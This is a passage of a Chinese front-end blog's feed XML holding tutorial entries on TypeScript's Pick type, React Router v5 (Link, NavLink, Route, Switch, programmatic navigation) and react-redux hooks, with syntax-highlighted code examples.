class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Props &#123;</span><br><span class="line">  id: <span class="built_in">string</span>;</span><br><span class="line">  title: <span class="built_in">string</span>;</span><br><span class="line">  children: <span class="built_in">number</span>[];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> PickProps = Pick&lt;Props, <span class="string">'id'</span> | <span class="string">'title'</span>&gt;;</span><br></pre></td></tr></table></figure><ul><li>解释:<ol><li>Pick 工具类型有两个类型变量:1 表示选择谁的属性 2 表示选择哪几个属性。</li><li>其中第二个类型变量，如果只选择一个则只传入该属性名即可，如果有多个使用联合类型即可。</li><li>第二个类型变量传入的属性只能是第一个类型变量中存在的属性。</li><li>构造出来的新类型 PickProps，只有 id 和 title 两个属性类型。</li></ol></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;TypeScript-高级类型&quot;&gt;&lt;a href=&quot;#TypeScript-高级类型&quot; class=&quot;headerlink&quot; title=&quot;TypeScript 高级类型&quot;&gt;&lt;/a&gt;TypeScript 高级类型&lt;/h1&gt;&lt;h2 id=&quot;TS-中的类型兼容性&quot;&gt;&lt;
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="TypeScript" scheme="//www.shen.ee/tags/TypeScript/"/>
    
      <category term="ts" scheme="//www.shen.ee/tags/ts/"/>
    
      <category term="TypeScript高级类型" scheme="//www.shen.ee/tags/TypeScript%E9%AB%98%E7%BA%A7%E7%B1%BB%E5%9E%8B/"/>
    
      <category term="ts泛型" scheme="//www.shen.ee/tags/ts%E6%B3%9B%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>React系列学习教程合集</title>
    <link href="//www.shen.ee/article/16686.html"/>
    <id>//www.shen.ee/article/16686.html</id>
    <published>2022-06-15T04:38:39.000Z</published>
    <updated>2022-06-22T06:24:25.997Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>算是一个简单的系列合集笔记记录，温度而知新</p></blockquote><ol><li><a href="https://www.iyouhun.com/post-221.html" target="_blank" rel="noopener">React快速上手</a></li><li><a href="https://www.iyouhun.com/post-222.html" target="_blank" rel="noopener">JSX语法学习</a></li><li><a href="https://www.iyouhun.com/post-223.html" target="_blank" rel="noopener">React组件基础</a></li><li><a href="https://www.iyouhun.com/post-224.html" target="_blank" rel="noopener">React组件通讯</a></li><li><a href="https://www.iyouhun.com/post-225.html" target="_blank" rel="noopener">React组件进阶及生命周期</a></li><li><a href="https://www.iyouhun.com/post-226.html" target="_blank" rel="noopener">深入浅出Hooks</a></li><li><a href="https://www.iyouhun.com/post-227.html" target="_blank" rel="noopener">Redux状态管理工具学习</a></li><li><a href="https://www.iyouhun.com/post-228.html" target="_blank" rel="noopener">react-redux学习</a></li><li><a href="https://www.iyouhun.com/post-229.html" target="_blank" rel="noopener">React路由</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;算是一个简单的系列合集笔记记录，温度而知新&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://www.iyouhun.com/post-221.html&quot; target=&quot;_blank&quot; rel=&quot;noopen
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="React" scheme="//www.shen.ee/tags/React/"/>
    
      <category term="React学习" scheme="//www.shen.ee/tags/React%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>React路由</title>
    <link href="//www.shen.ee/article/6674.html"/>
    <id>//www.shen.ee/article/6674.html</id>
    <published>2022-06-15T04:38:39.000Z</published>
    <updated>2022-06-22T06:24:26.002Z</updated>
    
    <content type="html"><![CDATA[<h2 id="React路由-基本使用"><a href="#React路由-基本使用" class="headerlink" title="React路由-基本使用"></a>React路由-基本使用</h2><blockquote><p>这里使用最广泛的 v5 版本，<a href="https://v5.reactrouter.com/" target="_blank" rel="noopener">v5 文档</a>、 <a href="https://react-router.docschina.org/web/guides/philosophy" target="_blank" rel="noopener">v5 中文文档</a></p><p>注意：v6 版本相比 v5 版本有破坏性更新！ <a href="https://reactrouter.com/" target="_blank" rel="noopener">v6 文档</a></p></blockquote><p><strong>步骤</strong>：</p><ol><li>安装：<code>yarn add react-router-dom@5.3.0</code></li><li>导入路由的三个核心组件：Router / Route / Link</li><li>使用 Router 组件包裹整个应用</li><li>使用 Link 组件作为导航菜单（路由入口）</li><li>使用 Route 组件配置路由规则和要展示的组件（路由出口）</li></ol><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; BrowserRouter <span class="keyword">as</span> Router, Route, Link &#125; <span class="keyword">from</span> <span class="string">'react-router-dom'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> First = <span class="function"><span class="params">()</span> =&gt;</span> &lt;p&gt;页面一的页面内容&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">const App = () =&gt; &#123;</span></span><br><span class="line"><span class="regexp">  return (</span></span><br><span class="line"><span class="regexp">    &lt;Router&gt;</span></span><br><span class="line"><span class="regexp">      &lt;div className="App"&gt;</span></span><br><span class="line"><span class="regexp">        &lt;ul&gt;</span></span><br><span class="line"><span class="regexp">          &lt;li&gt;</span></span><br><span class="line"><span class="regexp">            &#123;/</span>*</span><br><span class="line">              to属性：浏览器地址栏中的pathname（location.pathname）</span><br><span class="line">            *<span class="regexp">/&#125;</span></span><br><span class="line"><span class="regexp">            &lt;Link to="/</span>first<span class="string">"&gt;页面一&lt;/Link&gt;</span></span><br><span class="line"><span class="string">          &lt;/li&gt;</span></span><br><span class="line"><span class="string">        &lt;/ul&gt;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        &#123;/*</span></span><br><span class="line"><span class="string">          path属性：路由规则</span></span><br><span class="line"><span class="string">          component属性：展示的组件</span></span><br><span class="line"><span class="string">          Route 组件写在哪，渲染出来的组件就展示在哪</span></span><br><span class="line"><span class="string">        */&#125;</span></span><br><span class="line"><span class="string">        &lt;Route path="</span>/first<span class="string">" component=&#123;First&#125;&gt;&lt;/Route&gt;</span></span><br><span class="line"><span class="string">      &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/Router&gt;</span></span><br><span class="line"><span class="string"> )</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="React路由-Router模式"><a href="#React路由-Router模式" class="headerlink" title="React路由-Router模式"></a>React路由-Router模式</h2><ul><li><p>Router 组件：包裹整个应用，一个 React 应用只需要使用一次</p></li><li><p>两种常用 Router：<code>HashRouter</code> 和 <code>BrowserRouter</code></p></li><li><p>HashRouter：使用 URL 的哈希值实现（</p><p><a href="http://localhost:3000/#/first）" target="_blank" rel="noopener">http://localhost:3000/#/first）</a></p><ul><li>原理：监听 window 的 <code>hashchange</code> 事件来实现的</li></ul></li><li><p>（推荐）</p><p>BrowserRouter</p><p>：使用 H5 的 history.pushState() API 实现（</p><p><a href="http://localhost:3000/first）" target="_blank" rel="noopener">http://localhost:3000/first）</a></p><ul><li>原理：监听 window 的 <code>popstate</code> 事件来实现的</li></ul></li></ul><h2 id="React路由-Link-amp-NavLink组件"><a href="#React路由-Link-amp-NavLink组件" class="headerlink" title="React路由-Link&amp;NavLink组件"></a>React路由-Link&amp;NavLink组件</h2><p><code>Link</code> 组件：用于指定导航链接，会渲染成 a 标签</p><ul><li><code>to</code> 属性，将来会渲染成 a 标签的 href 属性</li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Link to=<span class="string">"/first"</span>&gt;页面一&lt;<span class="regexp">/Link&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ 渲染为：</span></span><br><span class="line"><span class="regexp">&lt;a href="/</span>first<span class="string">"&gt;页面一&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p>除了 Link 组件外，路由库中还提供了 <code>NavLink</code> 组件，可以在路由匹配时获得一个高亮类名，从而指定高亮效果（样式需要自己手动指定）</p><ul><li><p>使用方式同 Link 组件，只是额外获得一个高亮类名</p></li><li><p><code>activeClassName</code> 属性：用于指定高亮的类名，默认 <code>active</code></p></li><li><p><code>exact</code>属性：精确匹配，表示必须精确匹配（to 属性值和浏览器地址栏中的 pathname 相同），类名才生效</p><ul><li>默认情况下，React 路由中的 NavLink 的 to 属性在匹配的时候，默认是 <strong>模糊匹配</strong></li><li><strong>模糊匹配</strong>，表示：只要 浏览器地址栏中的 patchname（比如：/search/a）是以 NavLink to（/search） 属性的值开头的，此时，就会匹配成功</li></ul></li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;NavLink to=<span class="string">"/first"</span>&gt;页面一&lt;<span class="regexp">/NavLink&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ 渲染为：</span></span><br><span class="line"><span class="regexp">&lt;a href="/</span>first<span class="string">" class="</span>active<span class="string">"&gt;页面一&lt;/a&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// ---</span></span><br><span class="line"><span class="string">// Link 的模糊匹配和精确匹配</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 模糊匹配：</span></span><br><span class="line"><span class="string">// 浏览器地址栏中的 pathname 为：/search/a</span></span><br><span class="line"><span class="string">// 匹配成功的 to 属性为：</span></span><br><span class="line"><span class="string">// 1 /search ==&gt; 模糊匹配成功</span></span><br><span class="line"><span class="string">// 2 /search/a==&gt; 完全相同，匹配成功</span></span><br><span class="line"><span class="string">// 3 /sear==&gt; 匹配失败，因为 /search 是一块完整的内容，必须要出现这一整块内容才可以</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 精确匹配：</span></span><br><span class="line"><span class="string">// 浏览器地址栏中的 pathname 为：/search/a</span></span><br><span class="line"><span class="string">// 注意：添加 exact 属性后，变为精确匹配，此时，这个 NavLink 只能匹配 /search 这一个 patchname 了</span></span><br><span class="line"><span class="string">// React 中如果属性是 布尔值 可以只写属性名称，不用写后面的 = 等内容</span></span><br><span class="line"><span class="string">&lt;NavLink exact to="</span>/search<span class="string">"&gt;search 页面&lt;/NavLink&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 等价于：</span></span><br><span class="line"><span class="string">&lt;NavLink exact=&#123;true&#125; to="</span>/search<span class="string">"&gt;search 页面&lt;/NavLink&gt;</span></span><br></pre></td></tr></table></figure><h2 id="React路由-Route组件"><a href="#React路由-Route组件" class="headerlink" title="React路由-Route组件"></a>React路由-Route组件</h2><p><code>Route</code> 组件：用来配置路由规则</p><ul><li><code>path</code> 属性，指定路由规则</li><li><code>component</code> 属性，指定要渲染的组件</li><li><code>children</code> 子节点，指定要渲染的组件</li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用法一：使用 component 属性指定要渲染的组件</span></span><br><span class="line">&lt;Route path=<span class="string">"/search"</span> component=&#123;Search&#125; /&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用法二：使用 children 指定要渲染的组件</span></span><br><span class="line">&lt;Route path=<span class="string">"/search"</span>&gt;</span><br><span class="line">&lt;Search /&gt;</span><br><span class="line">&lt;<span class="regexp">/Route&gt;</span></span><br></pre></td></tr></table></figure><p>注意：对于 Route 来说，如果路由规则匹配成功，那么，就会渲染对应组件；否则，渲染 null 或者说不渲染任何内容</p><p>对于 Route 组件来说，<code>path</code> 属性是可选的：</p><ul><li>如果 Route 组件没有 path 属性，表示：该路由永远匹配成功，一定会渲染该组件</li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Route&gt;</span><br><span class="line">&lt;SomeComponent /&gt;</span><br><span class="line">&lt;<span class="regexp">/Route&gt;</span></span><br></pre></td></tr></table></figure><h2 id="React路由-路由匹配模式"><a href="#React路由-路由匹配模式" class="headerlink" title="React路由-路由匹配模式"></a>React路由-路由匹配模式</h2><p>路由有两种匹配模式：1 模糊匹配（默认）, 2 精确匹配</p><p><strong>模糊匹配</strong></p><ul><li>问题：当 Link组件的 to 属性值为 “/login”时，为什么 默认路由 也被匹配成功?</li><li>默认情况下，React 路由是<strong>模糊匹配</strong>模式</li><li>模糊匹配规则：只要 pathname（浏览器地址栏中的地址） 以 path 开头就会匹配成功</li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Link to=<span class="string">"/login"</span>&gt;登录页面&lt;<span class="regexp">/Link&gt;</span></span><br><span class="line"><span class="regexp">&lt;Route path="/</span><span class="string">" component=&#123;Home&#125; /&gt; 匹配成功</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// pathname 代表Link组件的to属性（也就是 location.pathname）</span></span><br><span class="line"><span class="string">// path 代表Route组件的path属性</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>path</th><th>能够匹配的pathname（浏览器地址栏）</th></tr></thead><tbody><tr><td>/</td><td>所有 pathname</td></tr><tr><td>/first</td><td>/first 或 /first/a 或 /first/a/b/…</td></tr></tbody></table><p><strong>精确匹配</strong></p><ul><li>问题：默认路由任何情况下都会展示，如何避免这种问题?</li><li>给 Route 组件添加 <code>exact</code> 属性，让其变为<strong>精确匹配</strong>模式</li><li>精确匹配：只有当 path 和 pathname 完全匹配时才会展示该路由</li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 此时，该组件只能匹配 pathname=“/” 这一种情况 </span></span><br><span class="line">&lt;Route exact path=<span class="string">"/"</span> component=... /&gt;</span><br></pre></td></tr></table></figure><h2 id="React路由-执行过程"><a href="#React路由-执行过程" class="headerlink" title="React路由-执行过程"></a>React路由-执行过程</h2><p>切换页面时，执行过程如下：</p><ol><li>点击 Link 组件（a标签），修改了浏览器地址栏中的 url</li><li>React 路由监听到地址栏 url 的变化 hashchange popstate</li><li>React 路由内部遍历所有 Route 组件，使用路由规则（path）与 pathname（hash）进行匹配</li><li>当路由规则（path）能够匹配地址栏中的 pathname（hash） 时，就展示该 Route 组件的内容</li></ol><p>注意：默认情况下，<strong>React 路由可以同时匹配成功多个</strong>，只要匹配成功，该路由组件对应的内容就会渲染到页面中</p><h2 id="React路由-Switch组件-amp-404页面"><a href="#React路由-Switch组件-amp-404页面" class="headerlink" title="React路由-Switch组件&amp;404页面"></a>React路由-Switch组件&amp;404页面</h2><p><code>Switch</code> 组件：包裹 Route 组件，<strong>只会渲染第一个匹配的组件</strong>，即使有多个路由都可以匹配成功</p><ul><li>在实际开发时，通常会用 <code>Switch</code> 组件包裹 <code>Route</code> 组件</li><li>通过 <code>Switch</code> 组件非常容易的就能实现 404 页面功能：</li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;Switch&gt;</span><br><span class="line">  &lt;Route exact path=<span class="string">"/"</span>&gt;</span><br><span class="line">  &lt;Home /&gt;</span><br><span class="line">  &lt;<span class="regexp">/Route&gt;</span></span><br><span class="line"><span class="regexp">  &lt;Route path="/</span>about<span class="string">"&gt;</span></span><br><span class="line"><span class="string">  &lt;About /&gt;</span></span><br><span class="line"><span class="string">  &lt;/Route&gt;</span></span><br><span class="line"><span class="string">  &lt;Route path="</span>/user<span class="string">"&gt;</span></span><br><span class="line"><span class="string">  &lt;User /&gt;</span></span><br><span class="line"><span class="string">  &lt;/Route&gt;</span></span><br><span class="line"><span class="string">  // 即使这个也可以匹配成功 /user/a 但是因为 Switch 组件的存在，这个路由对应的组件内容是不会渲染的</span></span><br><span class="line"><span class="string">  &lt;Route path="</span>/user/a<span class="string">"&gt;</span></span><br><span class="line"><span class="string">  &lt;User1 /&gt;</span></span><br><span class="line"><span class="string">  &lt;/Route&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;/* 以上路由规则全都不匹配时，展示 404 页面 */&#125;</span></span><br><span class="line"><span class="string">  &#123;/* 注意：这个路由需要放在最后，兜底 */&#125;</span></span><br><span class="line"><span class="string">  &lt;Route&gt;</span></span><br><span class="line"><span class="string">  &lt;NoMatch /&gt;</span></span><br><span class="line"><span class="string">  &lt;/Route&gt;</span></span><br><span class="line"><span class="string">&lt;/Switch&gt;</span></span><br></pre></td></tr></table></figure><h2 id="React路由-编程式导航"><a href="#React路由-编程式导航" class="headerlink" title="React路由-编程式导航"></a>React路由-编程式导航</h2><ul><li><p>场景：点击登录按钮，登录成功后，通过代码跳转到后台首页，如何实现？</p></li><li><p>编程式导航：通过 JS 代码来实现页面跳转</p></li><li><p>可以通过<code>useHistory</code>hook 来拿到路由提供的 history 对象，用于获取浏览器历史记录的相关信息。常用操作：</p><ul><li><code>push(path)</code>：跳转到某个页面，参数 path 表示要跳转的路径</li><li><code>replace(patch)</code>：跳转到某个页面，会替换当前的历史记录</li><li><code>go(n)</code>： 前进或后退到某个页面，参数 n 表示前进或后退页面数量（比如：-1 表示后退到上一页）</li></ul></li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useHistory &#125; <span class="keyword">from</span> <span class="string">'react-router-dom'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Login = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> history = useHistory()</span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> onLogin = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    history.push(<span class="string">'/home'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">  &lt;button onClick=&#123;onLogin&#125;&gt;登录&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">  )</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p><strong><code>push(path)</code>和 <code>replace(path)</code> 跳转路由的区别</strong>：</p><p>浏览器会自动记录访问过来的页面路径，可以简单的把理解为通过一个 数组 来记录的。</p><p>比如：我们访问了 3 个页面：[‘/login’, ‘/home’, ‘/search’]，当前所在页面为：’/search’</p><ol><li>此时，如果我们又通过 <code>push(&#39;/a&#39;)</code> 方法访问了一个新页面：’/a’，此时，就相当于往数组中 push 了一条数据，<ul><li>那么，访问该页面后，浏览器中的记录为：[‘/login’, ‘/home’, ‘/search’, ‘/a’]</li></ul></li><li>此时，如果我们又通过 <code>replace(&#39;/a&#39;)</code> 方法访问了一个新页面：’/a’，此时，就相当于把当前页面地址，替换为 ‘/a’<ul><li>那么，访问该页面后，浏览器中的记录为：[‘/login’, ‘/home’, ‘/a’]</li></ul></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;React路由-基本使用&quot;&gt;&lt;a href=&quot;#React路由-基本使用&quot; class=&quot;headerlink&quot; title=&quot;React路由-基本使用&quot;&gt;&lt;/a&gt;React路由-基本使用&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;这里使用最广泛的 v5 版本，&lt;a
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="React路由" scheme="//www.shen.ee/tags/React%E8%B7%AF%E7%94%B1/"/>
    
      <category term="react-router-dom" scheme="//www.shen.ee/tags/react-router-dom/"/>
    
  </entry>
  
  <entry>
    <title>react-redux学习</title>
    <link href="//www.shen.ee/article/57549.html"/>
    <id>//www.shen.ee/article/57549.html</id>
    <published>2022-06-15T04:38:39.000Z</published>
    <updated>2022-06-22T06:24:26.008Z</updated>
    
    <content type="html"><![CDATA[<h1 id="React-Redux介绍"><a href="#React-Redux介绍" class="headerlink" title="React-Redux介绍"></a>React-Redux介绍</h1><p>为什么要使用 React-Redux 绑定库?</p><p>React 和 Redux 是两个独立的库，两者之间职责独立。因此，为了实现在 React 中使用 Redux 进行状态管理 ，就需要一种机制，将这两个独立的库关联在一起。这时候就用到 React-Redux 这个绑定库了。</p><ul><li>作用：<strong>为 React 接入 Redux，实现在 React 中使用 Redux 进行状态管理</strong>。</li><li>react-redux 库是 Redux 官方提供的 React 绑定库。</li></ul><p><img src="https://oss.iyouhun.com/img/md/react-redux.443f85c0.jpeg" alt="react-redux.443f85c0"></p><h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><p><a href="https://react-redux.js.org/introduction/getting-started" target="_blank" rel="noopener">react-redux 文档</a></p><p>react-redux 的使用分为两大步：1 全局配置（只需要配置一次） 2 组件接入（获取状态或修改状态）</p><p>先看全局配置：</p><p><strong>步骤</strong>：</p><ol><li>安装 react-redux：<code>yarn add react-redux</code></li><li>从 react-redux 中导入 Provider 组件</li><li>导入创建好的 redux 仓库</li><li>使用 Provider 包裹整个应用</li><li>将导入的 store 设置为 Provider 的 store 属性值</li></ol><p><strong>核心代码</strong>：</p><p>src/index.js 中：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 导入 Provider 组件</span></span><br><span class="line"><span class="keyword">import</span> &#123; Provider &#125; <span class="keyword">from</span> <span class="string">'react-redux'</span></span><br><span class="line"><span class="comment">// 导入创建好的 store</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">'./store'</span></span><br><span class="line"><span class="keyword">const</span> root = ReactDOM.createRoot(<span class="built_in">document</span>.querySelector(<span class="string">'#root'</span>))</span><br><span class="line">root.render(</span><br><span class="line">  &lt;Provider store=&#123;store&#125;&gt;</span><br><span class="line">    &lt;App /&gt;</span><br><span class="line">  &lt;<span class="regexp">/Provider&gt;</span></span><br><span class="line"><span class="regexp">)</span></span><br></pre></td></tr></table></figure><h1 id="获取状态useSelector"><a href="#获取状态useSelector" class="headerlink" title="获取状态useSelector"></a>获取状态useSelector</h1><ul><li><code>useSelector</code>：获取 Redux 提供的状态数据</li><li>参数：selector 函数，用于从 Redux 状态中筛选出需要的状态数据并返回</li><li>返回值：筛选出的状态</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useSelector &#125; <span class="keyword">from</span> <span class="string">'react-redux'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Redux 中的状态是数值，所以，可以直接返回 state 本身</span></span><br><span class="line"><span class="keyword">const</span> count = useSelector(<span class="function"><span class="params">state</span> =&gt;</span> state)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 比如，Redux 中的状态是个对象，就可以：</span></span><br><span class="line"><span class="keyword">const</span> list = useSelector(<span class="function"><span class="params">state</span> =&gt;</span> state.list)</span><br></pre></td></tr></table></figure><p>例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useSelector &#125; <span class="keyword">from</span> <span class="string">'react-redux'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> App = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> count = useSelector(<span class="function"><span class="params">state</span> =&gt;</span> state)</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;计数器：&#123;count&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">      &lt;button&gt;数值增加&lt;/</span>button&gt;</span><br><span class="line">&lt;button&gt;数值减少&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="分发动作useDispatch"><a href="#分发动作useDispatch" class="headerlink" title="分发动作useDispatch"></a>分发动作useDispatch</h1><ul><li><p><code>useDispatch</code>：拿到 dispatch 函数，分发 action，修改 redux 中的状态数据</p></li><li><p>语法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useDispatch &#125; <span class="keyword">from</span> <span class="string">'react-redux'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用 useDispatch hook，拿到 dispatch 函数</span></span><br><span class="line"><span class="keyword">const</span> dispatch = useDispatch()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用 dispatch 传入 action，来分发动作</span></span><br><span class="line">dispatch( action )</span><br></pre></td></tr></table></figure></li></ul><p>例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useDispatch &#125; <span class="keyword">from</span> <span class="string">'react-redux'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> App = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> dispatch = useDispatch()</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;计数器：&#123;count&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">      &#123;/</span>* 调用 dispatch 分发 action *<span class="regexp">/&#125;</span></span><br><span class="line"><span class="regexp">      &lt;button onClick=&#123;() =&gt; dispatch(increment(2))&#125;&gt;数值增加&lt;/</span>button&gt;</span><br><span class="line">&lt;button onClick=&#123;() =&gt; dispatch(decrement(<span class="number">5</span>))&#125;&gt;数值减少&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 